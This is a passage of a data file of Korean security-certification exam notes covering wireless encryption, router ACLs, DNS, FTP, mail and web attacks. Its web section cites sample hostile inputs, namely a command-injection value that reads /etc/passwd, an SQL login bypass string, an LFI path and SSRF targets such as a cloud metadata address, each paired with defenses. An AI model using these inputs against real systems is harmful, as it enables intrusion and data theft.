     n("wep","WEP (Wired Equivalent Privacy)",["WEP는 초기 무선 보안 방식이지만 약점이 많아 쉽게 뚫리기 때문에, 왜 취약한지가 출제 포인트이다.","WEP(Wired Equivalent Privacy)는 RC4 암호를 사용한다.","24비트 IV(초기화 벡터)가 짧고 평문으로 전송되기 때문에 쉽게 뚫린다."],[],1),
     n("wpa","WPA (Wi-Fi Protected Access)",["WPA는 WEP의 약점을 보완하기 위해 나온 방식이라, 세대별로 쓰는 암호 방식을 짝지어 외워 둔다.","WPA(Wi-Fi Protected Access)는 TKIP를 사용한다."]),
     n("wpa2","WPA2 (Wi-Fi Protected Access 2)",["WPA2는 무선 보안 세대 중 하나로, 세대별 암호 방식을 묻는 문제에 대비해 짝지어 외워 둔다.","WPA2(Wi-Fi Protected Access 2)는 AES-CCMP를 사용한다."],[],1),
     n("wpa3","WPA3 (Wi-Fi Protected Access 3)",["WPA3는 가장 최신 세대의 무선 보안 방식이라, 앞 세대와 구별되는 방식을 기억해 둔다.","WPA3(Wi-Fi Protected Access 3)는 AES-GCMP와 SAE를 사용한다."])
    ]),
    n("e2ee","E2EE (End-to-End Encryption)",["메신저처럼 서버를 거쳐 가는 서비스에서는 서버가 해킹되거나 운영자가 내용을 볼 위험이 있어서, 서버조차 내용을 볼 수 없게 하는 암호화가 필요하다. 29회에 출제되었다.","E2EE(End-to-End Encryption, 종단 간 암호화)는 보내는 기기에서 암호화하고 받는 기기에서만 복호화하는 방식이다.","TLS는 내 기기와 서버 사이 구간만 암호화하기 때문에 서버에서는 내용이 풀리지만, E2EE는 서버도 내용을 볼 수 없다.","서버에 저장된 상태에서도 암호화가 유지된다."],[],1)
   ])
  ]),
  n("s2c4","4장 취약점 점검",["라우터와 보안장비 설정이 잘못되어 있으면 아무리 좋은 장비를 써도 공격을 막을 수 없기 때문에, 실기에서는 설정 명령어를 직접 쓰는 문제가 나온다.","4장은 라우터와 보안장비의 설정을 점검하는 내용을 다루며, 명령어는 대부분 시스코 명령어이다."],[
   n("rfilter","라우터 필터링 (2회)",["라우터는 내부망과 외부망의 경계에 있어서, 위조되거나 불필요한 트래픽을 가장 먼저 걸러 낼 수 있는 곳이다. 2회에 출제되었다.","라우터 필터링은 어느 방향의 트래픽을 걸러 내는지에 따라 Ingress, Egress, Blackhole 필터링으로 나뉜다."],[
    n("ingress","Ingress 필터링",["외부에서 들어오는 패킷의 출발지 IP가 위조되어 있으면 반사·증폭 공격 같은 DDoS의 통로가 되기 때문에, 들어오는 길목에서 걸러 내는 것이 중요하다.","Ingress 필터링은 외부에서 내부로 들어오는 패킷 가운데 출발지 IP가 위조되었거나 악성으로 알려진 패킷을 차단하는 방식이다."],[],1),
    n("egress","Egress 필터링",["내부 PC가 감염되면 출발지를 위조한 패킷을 밖으로 보내 다른 곳을 공격하는 데 동원될 수 있으므로, 나가는 길목에서도 걸러 내야 한다.","Egress 필터링은 내부에서 외부로 나가는 패킷 가운데 출발지 IP가 위조되었거나 허용되지 않은 포트를 쓰는 패킷을 차단하는 방식이다. 이렇게 하면 내부 PC가 공격에 동원되는 것을 막을 수 있다."],[],1),
    n("blackhole","Blackhole 필터링 (Null Routing)",["특정 IP에서 대량의 공격 트래픽이 들어올 때, 라우터 부담을 줄이면서 빠르게 버리는 방법이 필요하다.","Blackhole 필터링(Null Routing)은 특정 IP의 트래픽을 존재하지 않는 경로(null interface)로 보내서 폐기하는 방식이다."],[],1)
   ]),
   n("acl","시스코 ACL",["실기에서는 시스코 ACL 명령어를 직접 쓰거나 빈칸을 채우게 하는 문제가 자주 나오므로, 명령어 형식을 정확히 외워야 한다.","시스코 ACL의 형식은 `access-list 번호 동작 프로토콜 출발지 목적지 eq 포트`이다.","ACL 번호가 100~199이면 확장 ACL이다."],[
    n("acldns","DNS 대량 트래픽 차단 (6회)",["DNS 증폭처럼 DNS 트래픽이 대량으로 몰리는 공격을 라우터에서 막는 명령어를 쓰는 문제가 6회에 출제되었다.","DNS 대량 트래픽은 `access-list 110 deny udp any any eq 53` 명령으로 차단한다.","DNS는 UDP 53 포트를 사용하기 때문에 `udp`와 `eq 53`을 지정한다."],[],1),
    n("aclsmurf","Smurf 방어 설정 (20회 서술)",["Smurf 공격을 라우터 설정으로 막는 방법을 서술하는 문제가 20회에 출제되었다.","`access-list 100 deny icmp 192.168.1.0 0.0.0.255 any`는 내부 대역을 사칭한 ICMP 패킷을 차단한다.","`access-list 100 permit ip any any`는 그 밖의 나머지 트래픽을 허용한다.","`interface FastEthernet0/0`에서 `ip access-group 100 in`을 입력해, 이 ACL을 인터페이스로 들어오는 트래픽에 적용한다.","`no ip directed-broadcast`는 Directed Broadcast가 브로드캐스트로 변환되는 것을 차단한다."])
   ]),
   n("rsvc","라우터 서비스 · 계정",["쓰지 않는 서비스가 켜져 있거나 비밀번호가 평문으로 저장되어 있으면 라우터 자체가 공격 대상이 되므로, 라우터 서비스와 계정 점검이 중요하다.","기본 원칙은 쓰지 않는 서비스는 끄고, 비밀번호는 암호화해서 저장하는 것이다."],[
    n("nosnmp","SNMP 끄기 (21회)",["SNMP는 장비 정보를 외부에 알려 주는 서비스라서, 쓰지 않는데 켜 두면 정보 유출의 통로가 될 수 있다. 21회에 출제되었다.","라우터에서 SNMP를 끄는 명령은 `Router(config)# no snmp-server`이다."],[],1),
    n("snmpsec","SNMP 보안 설정 4가지 (24회 서술)",["SNMP를 꼭 써야 하는 경우에는 끄는 대신 안전하게 설정해야 하므로, 보안 설정 방법을 서술하는 문제가 24회에 출제되었다.","SNMP 보안 설정 4가지는 SNMPv3 사용, 추측하기 어려운 Community String 사용, SNMP 접근을 제한하는 ACL 설정, Community 권한을 읽기 전용(RO)으로 설정하는 것이다."]),
    n("rpw","라우터 비밀번호 (1회 서술)",["라우터 설정 파일이 유출되면 비밀번호가 그대로 드러날 수 있으므로, 비밀번호 저장 방식에 관한 서술 문제가 1회에 출제되었다.","`service password-encryption`은 설정 파일에서 비밀번호가 암호화된 형태로 보이게 하는 명령이다.","`enable secret`은 비밀번호를 일방향 암호화로 저장하고, `enable password`는 평문으로 저장한다. 따라서 `enable secret`을 쓰는 것이 안전하다."]),
    n("vlanstat","VLAN 정적 · 동적 (28회)",["VLAN을 어떻게 할당하느냐에 따라 관리 방법이 달라지므로, 정적 VLAN과 동적 VLAN을 구별하는 문제가 28회에 출제되었다.","정적 VLAN은 관리자가 포트마다 VLAN을 직접 설정하는 방식이며, 가장 일반적으로 쓰인다.","동적 VLAN은 관리 서버의 정책에 따라 VLAN이 자동으로 할당되는 방식이다.","VLAN 설정을 확인하는 명령은 `show vlan`이다."],[],1)
   ]),
   n("secacct","보안장비 계정 관리 (12회 서술)",["보안장비의 기본 계정과 기본 패스워드는 널리 알려져 있어서 그대로 두면 쉽게 장악당하므로, 계정 관리 방법을 서술하는 문제가 12회에 출제되었다.","보안장비 계정 관리 방법은 Default 계정 변경, Default 패스워드 변경, 계정별 권한 설정, 미사용 계정 삭제의 네 가지이다."])
  ])
 ]),
 n("s3","3과목 애플리케이션 보안",["실제 공격은 대부분 사용자가 직접 쓰는 인터넷 서비스와 애플리케이션을 통해 들어오기 때문에, 이 과목은 실기에서 단답형·서술형이 꾸준히 나오는 핵심 영역이다.","3과목은 인터넷 서비스(FTP·메일·웹·DNS·DB)의 보안에서 시작해 웹 취약점, 시스템 공격 기법, 그리고 설정 점검까지 순서대로 다룬다."],[
  n("s3c1","1장 인터넷 응용 보안",["FTP·메일·웹·DNS·DB는 오래전에 만들어진 프로토콜이라 인증이 약하고 평문으로 통신하기 때문에, 어디가 약한지 알아야 공격과 대응을 이해할 수 있다.","1장은 FTP, 메일, 웹, DNS, DB 다섯 가지 인터넷 서비스의 동작 방식과 이를 노리는 공격, 그리고 대응 방법을 다룬다."],[
   n("dns","DNS (Domain Name System)",["DNS는 거의 모든 인터넷 통신의 첫 단계여서, 이것이 속으면 사용자가 가짜 사이트로 끌려가게 된다.","DNS(Domain Name System)는 도메인 이름과 IP 주소를 서로 바꿔 주는 시스템이다.","DNS 관련 문제를 모두 푼 뒤에 스푸핑 같은 공격 내용을 더 채울 예정이다."],[
    n("zone","존 파일 · 자원 레코드 (7회)",["DNS 설정과 공격 문제를 이해하려면 DNS가 정보를 어떻게 저장하는지부터 알아야 하며, 7회에 출제되었다.","존 파일은 DNS 서버가 맡은 구역(존)의 레코드를 저장하는 파일이다. 비유하면 전화번호부 책 한 권과 같다.","자원 레코드(RR)는 이름과 값을 짝지은 한 줄의 정보이다.","종류로는 A(IPv4 주소), AAAA(IPv6 주소), CNAME(별명), MX(메일 서버), NS(DNS 서버), PTR(IP를 도메인으로), SOA(존의 기본 정보), TXT(SPF·DKIM 등)가 있다."],[],1),
    n("nsflow","네임 서버 종류 (26회)",["DNS 조회가 어떤 서버를 거치는지 알아야 스푸핑이나 캐시 포이즈닝이 어디를 노리는지 이해할 수 있으며, 26회에 출제되었다.","주소를 물으면 맨 위의 루트 서버부터 한 단계씩 내려가며 찾는다. 관련 서버로는 캐시 DNS 서버, 루트 네임 서버, TLD 네임 서버, 책임 네임 서버가 있다."],[
     n("cachens","캐시 DNS 서버",["캐시 DNS 서버는 많은 사용자가 함께 쓰기 때문에, 여기가 오염되면 피해가 한꺼번에 퍼진다.","캐시 DNS 서버는 사용자 PC가 처음 주소를 묻는 곳(통신사 DNS 등)으로, 조회 결과를 캐시에 잠깐 저장해 둔다.","캐시에 답이 없으면 루트, TLD, 책임 네임 서버 순서로 대신 찾아 준다.","그래서 캐시 포이즈닝 공격의 표적이 된다."],[],1),
     n("rootns","루트 네임 서버",["모든 DNS 조회는 결국 루트에서 출발하므로, 조회 순서 문제에서 첫 단계로 나온다.","루트 네임 서버는 DNS 계층의 맨 꼭대기에 있는 서버로, `.com`, `.kr` 같은 TLD 서버가 어디에 있는지 알고 있다."]),
     n("tldns","TLD (Top-Level Domain) 네임 서버",["TLD 네임 서버는 루트와 책임 서버 사이를 이어 주는 중간 단계이다.","TLD(Top-Level Domain) 네임 서버는 `.com`, `.org`, `.net`, `.kr` 같은 최상위 도메인을 관리한다.","예를 들어 `jian.com`을 맡은 책임 서버가 어디인지 알고 있다."]),
     n("authns","책임 네임 서버 (Authoritative)",["책임 네임 서버가 주는 답이 최종 정답이므로, 이 서버의 정보와 존 전송 설정이 보안에서 중요하다.","책임 네임 서버(Authoritative)는 특정 도메인의 DNS 정보를 직접 관리하는 서버로, 존 파일을 가지고 있어 최종 정답을 준다.","주 DNS 서버와 부 DNS 서버(백업)로 구성되며, 부 서버는 존 전송으로 주 서버와 내용을 맞춘다.","답을 쓸 때 철자는 Authoritative이다."],[],1)
    ],1),
    n("dnscache","DNS 캐싱 · TTL (Time To Live) (8회)",["매번 처음부터 주소를 찾으면 느리기 때문에 DNS는 결과를 잠시 저장해 두는데, 이 저장 방식이 캐시 포이즈닝 같은 공격과 연결되며 8회에 출제되었다.","DNS 캐싱은 조회 결과를 캐시에 TTL(Time To Live, 유효 시간)만큼 저장해 두고 다시 쓰는 것이다.","TTL이 지나면 저장한 내용을 지우고 다시 묻는다. IP가 바뀔 수 있기 때문에 이렇게 기한을 둔다."],[],1),
    n("hostsfile","hosts 파일 (9회)",["hosts 파일은 DNS보다 먼저 참조되기 때문에, 악성코드가 이 파일을 바꾸면 파밍에 악용되며 9회에 출제되었다.","hosts 파일은 도메인과 IP의 짝을 수동으로 지정하는 파일로, 모든 OS에 있다.","조회 순서는 hosts 파일, DNS 캐시, DNS 서버 순이다. 즉 DNS보다 먼저 본다.","위치는 리눅스가 `/etc/hosts`, 윈도우가 `C:\\Windows\\System32\\drivers\\etc\\hosts`이다.","악성코드가 이 파일을 바꾸면 은행 주소를 가짜 IP로 보내는 파밍이 일어난다.","TCP Wrapper의 `hosts.allow`·`hosts.deny`와는 이름만 비슷할 뿐 다른 파일이다."],[],1),
    n("dnsspoof","DNS 스푸핑 (17회)",["DNS가 속으면 사용자가 주소를 정확히 입력해도 가짜 사이트로 가게 되므로 피싱·파밍에 악용되며, 17회에 출제되었다.","정상적으로는 사용자가 DNS에 도메인을 질의하면 DNS 서버가 진짜 IP를 응답한다.","DNS 스푸핑은 가짜 DNS 응답으로 사용자를 가짜 사이트로 보내는 공격이다. 사용자가 질의하면 공격자가 진짜 응답보다 먼저 가짜 IP를 보내고, 사용자는 먼저 온 응답을 믿고 늦게 온 진짜 응답은 버린다.","DNS는 UDP를 써서 응답이 진짜인지 확인하지 않기 때문에 이런 일이 가능하다.","캐시 포이즈닝은 DNS 서버의 캐시에 가짜 IP를 넣는 방식으로, TTL 동안 그 서버를 쓰는 모든 사용자가 피해를 입는다.","대응은 DNS 응답에 전자서명을 붙이는 DNSSEC이다."],[],1),
    n("subtake","서브 도메인 하이재킹 (20회)",["클라우드 서비스를 해지하면서 DNS 레코드 정리를 잊으면, 회사 도메인이 공격자 페이지를 보여 주게 되므로 위험하며 20회에 출제되었다.","서브 도메인 하이재킹은 서브 도메인 테이크오버(Subdomain Takeover)라고도 부른다.","정상적으로는 `shop.jian.com`을 CNAME으로 `jian-shop.클라우드.com`에 연결해 쓴다. 그런데 클라우드 서비스만 해지하고 CNAME 레코드는 남겨 두는 경우가 있다.","이때 공격자가 같은 이름(`jian-shop`)으로 클라우드에 다시 등록하면, `shop.jian.com`이 공격자 페이지를 보여 주게 되어 피싱이나 쿠키 탈취에 쓰인다.","대응은 서비스를 끊을 때 DNS 레코드도 함께 삭제하고, DNS를 주기적으로 점검하는 것이다."],[],1)
   ]),
   n("ftp","FTP (File Transfer Protocol)",["FTP는 연결 구조가 독특해서 동작 모드 문제와 이 구조를 악용하는 공격 문제가 함께 나오므로, 먼저 연결 구조를 정확히 알아 두어야 한다.","FTP(File Transfer Protocol)는 파일을 주고받는 프로토콜로, 연결을 두 개 사용한다.","하나는 명령을 주고받는 제어 채널(TCP 21)이고, 다른 하나는 실제 파일이 오가는 데이터 채널(TCP 20 등)이다."],[
    n("ftpmode","동작 모드 (10회)",["방화벽이 어느 방향의 연결을 막느냐에 따라 FTP가 되기도 하고 안 되기도 하므로, 두 모드의 차이를 아는 것이 중요하며 10회에 출제되었다.","FTP의 동작 모드는 데이터 연결을 서버와 클라이언트 중 누가 먼저 거느냐에 따라 Active 모드와 Passive 모드로 나뉜다."],[
     n("active","Active 모드",["Active 모드는 서버가 클라이언트 쪽으로 연결을 걸기 때문에, 클라이언트 쪽 방화벽에서 문제가 생기는 이유를 이해하는 것이 핵심이다.","Active 모드에서는 클라이언트가 `PORT` 명령으로 자신이 데이터를 받을 포트를 알려 주면, 서버가 20번 포트에서 클라이언트 쪽으로 먼저 연결한다.","바깥에서 안으로 들어오는 연결이 되므로 클라이언트 방화벽에 막히기 쉽다."]),
     n("passive","Passive 모드",["Passive 모드는 Active 모드가 클라이언트 방화벽에 막히는 문제를 피하기 위해 쓰이며, 연결 방향이 Active 모드와 반대라는 점이 시험의 핵심이다.","Passive 모드에서는 클라이언트가 `PASV` 명령을 보내면 서버가 1024번 이상의 임의 포트를 열고 그 번호를 알려 준다.","그러면 클라이언트가 그 포트로 먼저 데이터 연결을 건다."])
    ],1),
    n("ftpattack","FTP 관련 공격 (2회)",["FTP는 구조상 허점과 약한 인증 때문에 여러 공격의 대상이 되어 왔으며, 2회에 관련 문제가 출제되었다.","이 묶음은 FTP의 구조와 약한 인증을 노리는 TFTP, 익명 FTP, FTP Bounce 공격을 다룬다."],[
     n("tftp","TFTP (Trivial File Transfer Protocol)",["TFTP는 인증 없이 파일을 주고받을 수 있어서, 열려 있으면 누구나 파일을 가져가거나 올릴 위험이 있다.","TFTP(Trivial File Transfer Protocol)는 UDP 69번 포트를 쓰는 단순한 파일 전송 프로토콜이다.","인증 같은 보안 기능이 없다."]),
     n("anonftp","익명 FTP",["익명 FTP는 아이디·비밀번호 없이 누구나 들어올 수 있는 통로이므로, 잘못 열어 두면 서버가 악성 파일 보관소로 쓰일 수 있다.","익명 FTP는 `anonymous` 계정으로 누구나 로그인할 수 있게 한 FTP 서비스이다.","쓰기 권한까지 있으면 악성 파일 업로드에 악용된다.","대응은 익명 FTP를 비활성화하는 것이다."],[],1),
     n("bounce","FTP Bounce",["FTP Bounce는 FTP 서버를 공격 중계지로 삼아 공격자의 정체를 숨기는 공격이어서, FTP 구조의 허점을 묻는 대표 문제로 나온다.","정상적인 Active 모드에서는 클라이언트가 `PORT` 명령에 자기 IP와 포트를 적어 서버가 그쪽으로 데이터 연결을 열게 한다.","공격자는 `PORT` 명령에 자기 주소 대신 제3자 서버의 IP와 포트를 적는다. 서버는 목적지를 확인하지 않고 그쪽으로 데이터 연결을 연다.","그 결과 FTP 서버가 공격자 대신 포트 스캔이나 공격을 하게 되고, 공격자의 IP는 숨겨진다."],[],1)
    ])
   ]),
   n("tcpwrap","TCP Wrapper",["서버 안에서 서비스별로 접속할 수 있는 IP를 간단히 제한할 수 있어 기본 보안 설정으로 자주 쓰이며, 2회에 출제되었다.","TCP Wrapper는 서버 안에서 서비스 접근을 IP 기준으로 통제하는 도구이다. `inetd`가 요청을 받으면 `tcpd`가 먼저 검사하고, 통과한 경우에만 실제 서비스를 실행한다.","검사 순서는 `/etc/hosts.allow`(허용)를 먼저 보고, 다음에 `/etc/hosts.deny`(거부)를 보며, 둘 다 해당하지 않으면 허용한다.","보통 `hosts.deny`에 `ALL:ALL`을 적어 모두 막고, `hosts.allow`에는 허용할 IP만 적는다.","라우터에서 쓰는 `access-list`와는 다른 것이므로 구분해야 한다."],[],1),
   n("mail","메일 보안",["메일은 평문으로 여러 서버를 거쳐 전달되기 때문에, 중간에서 내용을 읽거나 바꾸거나 보낸 사람을 위장하는 일이 가능하다.","메일 보안은 이런 문제를 막기 위한 암호화·전자서명 기술(PGP, S/MIME)과 발신자 위조 방지 기술(SPF·DKIM·DMARC)을 다룬다."],[
    n("pgp","PGP (Pretty Good Privacy)",["메일 내용을 암호화하고 서명하는 대표 기술로, 19회에 출제되었다.","PGP(Pretty Good Privacy)는 1991년 필 짐머만이 만든 메일 보안 프로그램으로, 표준은 OpenPGP(RFC 4880)이며 메일 프로그램의 플러그인 형태로 쓴다.","암호화로 기밀성을, 전자서명으로 무결성과 인증을 제공한다.","인증기관 없이 사용자끼리 서로의 신뢰를 보증한다는 점이 특징이다."],[],1),
    n("smime","S/MIME (Secure/Multipurpose Internet Mail Extensions)",["PGP와 함께 메일 보안의 두 축이며, 신뢰를 누가 보증하느냐가 PGP와의 차이로 자주 비교된다.","S/MIME(Secure/Multipurpose Internet Mail Extensions)는 인증기관(CA)이 발급한 인증서를 기반으로 하는 메일 보안 방식이다."]),
    n("spfdkim","SPF (Sender Policy Framework) · DKIM (DomainKeys Identified Mail) · DMARC",["메일은 보낸 사람 주소를 쉽게 속일 수 있어 피싱에 악용되므로, 발신자 위조를 막는 기술이 필요하며 16회에 서술형으로 출제되었다.","SPF, DKIM, DMARC는 모두 DNS의 TXT 레코드를 이용해 발신자 위조를 막는 기술이다.","SPF(Sender Policy Framework)는 메일을 보낸 서버의 IP가 그 도메인이 허용한 목록에 있는지 확인한다.","DKIM(DomainKeys Identified Mail)은 메일에 전자서명을 붙이고, 받는 쪽이 DNS에 공개된 공개키로 서명을 검증한다.","DMARC는 SPF와 DKIM을 합쳐 검증에 실패한 메일을 어떻게 처리할지 정한 정책이다."])
   ]),
   n("webapp","웹 애플리케이션 보안",["웹은 가장 많이 노출된 서비스여서 기출 단답형이 특히 많이 나오는 영역이다.","이 묶음은 웹 관련 기출 단답형을 모은 것으로, 대부분 서버가 사용자 입력값을 그대로 믿어서 생기는 공격이다."],[
    n("inject","삽입 공격 (Injection)",["삽입 공격은 OWASP Top 10의 단골 항목으로 4회에 출제되었으며, SQL·명령어·파일 삽입이 모두 같은 원리에서 나온다.","삽입 공격(Injection)은 입력값이 데이터가 아니라 명령의 일부로 해석되어 실행되는 공격이다.","인터프리터(DB나 셸처럼 받은 글자를 바로 실행하는 프로그램)는 어디까지가 데이터이고 어디부터가 명령인지 스스로 구분하지 못하기 때문에 이런 일이 생긴다."],[
     n("sqli","SQL (Structured Query Language) 삽입",["DB에는 중요한 정보가 모여 있어서, 로그인 우회나 전체 데이터 조회로 이어지는 SQL 삽입은 가장 대표적인 웹 공격이다.","정상적으로는 로그인 화면에 입력한 값이 SQL 쿼리의 WHERE 조건에 데이터로 들어가 사용자를 찾는다.","공격자가 `' OR '1'='1`을 입력하면 WHERE 조건이 항상 참이 되어 로그인을 우회하거나 전체 데이터를 조회할 수 있다.","`'`는 문자열을 끊는 역할을 하고, `--`는 그 뒤를 주석으로 만들어 무시하게 한다."],[
      n("sqlidef","SQL 삽입 대응 (22회)",["SQL 삽입 대응은 22회에 출제되었으며, 한 단계만 막는 것이 아니라 입력·쿼리·실행 단계별로 대응을 나눠 써야 한다.","입력 단계에서는 클라이언트가 보낸 입력값에 특수문자(`'`, `--`, `;`)가 있는지 검사한다.","쿼리 단계에서는 동적 쿼리를 쓰지 않고 Prepared Statement를 써서 `?` 자리에 값만 넣는다.","실행 단계에서는 DB 애플리케이션을 최소 권한으로 구동해 공격이 성공하더라도 피해를 최소화한다."],[],1)
     ]),
     n("oscmd","운영체제 명령어 삽입",["명령어 삽입이 성공하면 공격자가 서버에서 원하는 명령을 그대로 실행할 수 있어 피해가 매우 크다.","이 취약점은 서버가 입력값을 셸 명령 뒤에 이어 붙여 실행할 때 생긴다. 웹의 ping 진단 기능이 대표적인 예이다.","정상적으로는 IP만 입력하지만, 공격자가 `8.8.8.8; cat /etc/passwd`를 입력하면 `;`, `|`, `&&` 뒤의 내용이 새 명령으로 실행된다.","대응은 셸을 거치지 않고 명령과 인자를 나눠 실행하는 것(Java `ProcessBuilder`), IP 형식만 허용하는 것, 특수문자를 거르는 것이다.","참고로 ICMP ping 패킷 안에 들어간 글자는 커널이 복사만 하므로 실행되지 않는다."],[],1),
     n("fileinc","파일 삽입 (File Inclusion)",["파일 삽입은 서버가 외부 악성 코드를 실행하거나 내부 중요 파일을 내보내게 만드는 공격으로, 5회에 대응 방법이 출제되었다.","이 취약점은 PHP의 `include`·`require`가 사용자 입력값으로 불러올 파일을 정할 때 생긴다.","RFI(원격 파일 삽입)는 외부 URL에 있는 악성 코드를 불러와 서버에서 실행하는 것이고, LFI(로컬 파일 삽입)는 `../../etc/passwd` 같은 서버 내부 파일을 읽는 것이다.","대응은 코드에서 `include`·`require` 사용을 점검하고, `php.ini`에서 `allow_url_fopen = Off`로 설정하는 것이다.","`allow_url_fopen`, `php.ini`, `Off` 세 가지를 묶어서 기억하면 된다."],[],1)
    ],1),
    n("forgery","스크립트 · 요청 위조",["XSS, CSRF, SSRF는 이름이 비슷해 헷갈리기 쉬우므로 정확히 구별하는 것이 중요하다.","이 묶음은 스크립트 삽입과 요청 위조 공격을 다루며, 누가 무엇을 믿는지를 기준으로 구별하면 된다."],[
     n("xss","XSS (Cross-Site Scripting)",["XSS는 웹에서 가장 흔한 공격 가운데 하나로 3·4회에 출제되었으며, 쿠키 탈취 같은 다른 공격의 출발점이 된다.","XSS(Cross-Site Scripting)는 입력값 검증이 부족한 틈을 타 악성 스크립트를 넣어, 그 스크립트가 피해자(다른 사용자)의 브라우저에서 실행되게 하는 공격이다.","문제에 '브라우저에서 실행', '다른 사용자의 정보 추출', '스크립트 삽입'이라는 표현이 나오면 XSS를 떠올리면 된다."],[],1),
     n("csrf","CSRF (Cross-Site Request Forgery)",["CSRF는 쿠키를 훔치지 않고도 사용자 권한으로 원하지 않는 일을 시킬 수 있어서, XSS와 구별하는 문제로 자주 나온다.","정상적으로는 로그인한 사용자의 브라우저가 요청을 보낼 때 그 사이트의 쿠키를 자동으로 붙여 보낸다.","CSRF(Cross-Site Request Forgery)는 이 자동 전송을 악용해, 사용자가 의도하지 않은 요청을 브라우저가 쿠키를 붙여 서버로 보내게 만드는 공격이다. 쿠키를 훔치지는 않는다.","대응으로는 CSRF 토큰, SameSite 쿠키, Referer·Origin 검사, 중요 기능 실행 전 재인증이 있다."],[],1),
     n("ssrf","SSRF (Server-Side Request Forgery)",["SSRF는 외부에서 직접 닿을 수 없는 내부망을 서버를 통해 들여다보게 하는 공격이어서 클라우드 시대에 특히 위험하며, 28회에 출제되었다.","SSRF(Server-Side Request Forgery)는 서버가 다른 서버로 요청을 보낼 때 검증되지 않은 입력값을 허용하여, 서버가 공격자가 고른 곳으로 요청을 보내게 만드는 공격이다.","예를 들어 URL 미리보기 기능에 `http://192.168.0.10/admin`이나 클라우드 메타데이터 주소(`169.254.169.254`)를 입력하면 내부망 정보가 유출된다.","CSRF는 피해자의 브라우저(Client)가 요청을 보내고, SSRF는 서버(Server)가 요청을 보낸다는 점이 다르다."],[],1)
    ]),
    n("upload","파일 업로드 · 웹 셸",["파일 업로드 공격과 웹 셸은 한 세트로 쓰이기 때문에 둘의 관계를 정확히 알아야 문제에서 헷갈리지 않는다.","파일 업로드는 공격 방법이고, 웹 셸은 그 방법으로 서버에 올리는 악성 파일이다."],[
     n("fupload","파일 업로드 공격",["업로드 기능은 거의 모든 사이트에 있어서, 검증이 허술하면 서버를 통째로 장악당하는 입구가 되며 5회에 출제되었다.","정상적으로 게시판 첨부 기능은 이미지나 문서 파일을 올리는 데 쓴다.","공격자는 이 기능으로 서버 스크립트 파일(`.php`, `.jsp`)을 올린 뒤, 그 파일 주소로 접속해 서버에서 실행시킨다.","대응은 허용한 확장자만 받기(화이트리스트), 업로드 폴더의 실행 권한 제거, 파일명 변경, 웹 루트 밖에 저장하기이다."],[],1),
     n("webshell","웹 셸 (Web Shell)",["웹 셸이 서버에 올라가면 공격자가 브라우저만으로 서버를 원격 조종할 수 있으므로 매우 위험하며, 7회에 출제되었다.","웹 셸(Web Shell)은 PHP·ASP·JSP처럼 서버가 실행하는 언어로 만든 악성 스크립트 파일이다.","이 파일을 통해 서버에서 명령을 실행하고 서버를 원격으로 제어한다.","XSS는 피해자의 브라우저에서 실행되고, 웹 셸은 서버에서 실행된다는 점이 다르다."],[],1)
    ],1),
    n("webetc","웹 점검 · 기타 용어",["웹 점검에 쓰는 도구와 관련 용어는 단답형에 자주 나오는 단골 문제이다.","이 묶음은 웹 프록시 도구, 프록시 서버, robots.txt, 딥링크, 아파치 로그를 다룬다."],[
     n("proxy","프록시 서버",["프록시 서버는 속도·통제·보안 목적으로 널리 쓰이며, 4회에 출제되었다.","프록시 서버는 클라이언트 대신 외부 서버에 접속해 주는 서버이다.","캐시로 속도를 높이고, 접근을 통제하며, 내부 IP를 숨기는 역할을 한다.","반대로 서버 앞에서 서버 대신 요청을 받는 것은 리버스 프록시라고 한다."]),
     n("webproxy","웹 프록시 도구",["웹 점검은 서버에 이상한 값을 보내 보고 서버의 반응을 살피는 일인데, 웹 프록시 도구가 바로 이것을 가능하게 해 주는 공구이며 25회에 출제되었다.","웹 프록시 도구는 브라우저와 서버 사이에서 요청을 붙잡아 내용을 보고, 고쳐서 서버로 보내는 도구이다.","이 도구로 화면(클라이언트)에서 하는 검증을 우회할 수 있으므로, 서버에서도 반드시 다시 검증해야 한다.","대표적인 예로 Burp Suite, Paros, OWASP ZAP이 있다."],[],1),
     n("robots","robots.txt",["robots.txt는 검색 엔진 수집을 제어하는 파일이지만 오히려 숨기고 싶은 경로를 드러낼 수 있어 보안 점검 대상이 되며, 15회에 출제되었다.","robots.txt는 사이트 루트에 두고 검색 엔진 크롤러에게 수집하지 말아야 할 경로를 알려 주는 파일이다.","강제력이 없어서 지키지 않는 크롤러를 막지 못하고, 오히려 숨긴 경로(`/admin`)가 드러날 수 있다.","답을 쓸 때 철자에 주의해야 하며, 끝에 s가 붙은 robots이다."],[],1),
     n("deeplink","딥링크 (Deep Link)",["모바일 앱이 늘면서 딥링크를 검증 없이 처리해 개인정보가 새는 사례가 생겼고, 18회에 출제되었다.","딥링크(Deep Link)는 모바일 앱의 특정 화면을 바로 여는 링크이다. 예를 들면 `myshop://product/1234` 같은 형태이다.","앱이 링크 값을 검증 없이 처리하면 카드 정보나 주소 같은 개인정보가 노출된다.","대응은 링크 값 검증, 민감한 화면을 열 때 재인증, App Links·Universal Links 사용이다."],[],1),
     n("apachelog","아파치 로그",["침해 사고가 나면 웹 서버 로그로 무슨 일이 있었는지 추적해야 하므로 로그 종류와 설정 위치를 알아야 하며, 19회에 출제되었다.","Access Log는 모든 요청을 기록하며 IP, 시간, 요청 내용, 상태 코드가 남는다.","Error Log는 서버 오류를 기록한다.","설정 파일 `httpd.conf`에서 `CustomLog`로 접속 로그 경로를, `ErrorLog`로 에러 로그 경로를 지정한다.","IIS에서는 `W3SVC1`에 웹 로그가, `HTTPERR`에 에러 로그가 남는다."],[],1)
    ])
   ]),
   n("db","데이터베이스 보안",["DB에는 돈이나 개인정보처럼 가장 중요한 데이터가 모여 있어서 공격자의 최종 목표가 되는 경우가 많다.","데이터베이스 보안은 DB 보안 통제 3가지, DB 암호화 방식, DB 공격 유형을 다룬다."],[
    n("dbatk","DB 공격 유형 (12회)",["DB 공격 유형은 앞의 통제와 짝을 이루므로 함께 외우면 좋으며, 12회에 출제되었다.","예를 들어 추론 공격은 추론 통제로 막는다. 이 묶음은 집합성 공격, 추론 공격, 데이터 디들링을 다룬다."],[
     n("aggr","집합성 (Aggregation) 공격",["하나하나는 공개해도 되는 정보라도 모아 놓으면 기밀이 될 수 있어서, 추론 공격과 구분하는 문제로 나온다.","집합성(Aggregation) 공격은 낮은 등급 정보 조각을 모아 높은 등급 정보를 알아내는 공격이다.","예를 들어 공개된 지사별 매출을 더해 기밀인 총매출을 알아낸다.","핵심은 '더하기(모으기)'이다."],[],1),
